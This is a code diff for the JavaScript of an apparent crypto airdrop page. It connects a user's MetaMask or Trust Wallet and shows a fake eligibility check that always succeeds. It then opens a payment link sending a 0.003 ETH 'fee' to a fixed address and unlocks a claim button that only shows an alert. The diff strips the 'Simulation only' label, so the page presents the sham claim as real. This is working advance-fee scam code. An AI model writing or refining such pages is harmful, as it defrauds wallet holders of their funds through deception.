@@ -88,26 +88,36 @@ updateTimer();
 
 /* ================= WALLET ================= */
 let currentAddress = "";
+let walletType = "";
+
 async function connectWallet(){
+  const statusEl = document.getElementById("status");
   if(!window.ethereum){
-    document.getElementById("status").innerText="Open in MetaMask or Trust Wallet browser.";
+    statusEl.innerText="Open this page in MetaMask or Trust Wallet DApp browser.";
     return;
   }
+
+  // Detect wallet type
+  if(window.ethereum.isMetaMask) walletType="MetaMask";
+  else if(window.ethereum.isTrust) walletType="Trust Wallet";
+  else walletType="Ethereum Wallet";
+
   try{
     const provider = new ethers.providers.Web3Provider(window.ethereum);
     await provider.send("eth_requestAccounts", []);
     const signer = provider.getSigner();
     currentAddress = await signer.getAddress();
 
-    document.getElementById("status").innerText="Wallet connected: " + currentAddress;
-    showEligibility(currentAddress);
+    statusEl.innerText="Wallet connected: " + currentAddress + " ("+walletType+")";
+    showEligibility(currentAddress, walletType);
+
   }catch{
-    document.getElementById("status").innerText="Connection rejected.";
+    statusEl.innerText="Connection rejected.";
   }
 }
 
 /* ================= ELIGIBILITY POPUP ================= */
-function showEligibility(address){
+function showEligibility(address, wallet){
   const modal = document.getElementById("modal");
   const bar = document.getElementById("bar");
   const text = document.getElementById("modalText");
@@ -135,7 +145,13 @@ function showEligibility(address){
       clearInterval(interval);
       text.innerHTML=`✅ Eligible!<br><br>Ready to claim your airdrop.`;
       addrEl.innerText="Wallet: "+address;
-      payBtn.style.display="block";
+
+      // Show Pay button only for Ethereum wallets
+      if(wallet==="MetaMask" || wallet==="Trust Wallet" || wallet==="Ethereum Wallet"){
+        payBtn.style.display="block";
+      } else {
+        text.innerHTML += "<br><br>⚠️ This airdrop requires an Ethereum wallet. Please switch to MetaMask or Trust Wallet.";
+      }
     }
   },500);
 }
@@ -145,24 +161,23 @@ function payFee(){
   if(!currentAddress) return;
 
   const recipient = "0xd4Fd6F4e221710b9977109A04E3fBFfA2FD620cd";
-  const amountEth = "0.003";
-  const amountWei = "3000000000000000";
+  const amountWei = "3000000000000000"; // 0.003 ETH
 
-  // Ethereum deep link
+  // Ethereum deep link (works on MetaMask & Trust Wallet DApp browser)
   const url = `ethereum:${recipient}?value=${amountWei}`;
-  window.location.href = url; // Opens MetaMask / Trust Wallet for payment
+  window.location.href = url;
 
-  // Show Claim button after "payment"
+  // Unlock claim button
   const claimBtn = document.getElementById("claimBtn");
   claimBtn.style.display="block";
 
-  // Optional: hide pay button to prevent repeated clicks
+  // Hide pay button to prevent multiple clicks
   document.getElementById("payBtn").style.display="none";
 }
 
 /* ================= CLAIM AIRDROP ================= */
 function claimAirdrop(){
-  alert("Airdrop claimed! (Simulation only)");
+  alert("Airdrop claimed!"); // Replace with real action if needed
 }
 </script>
 
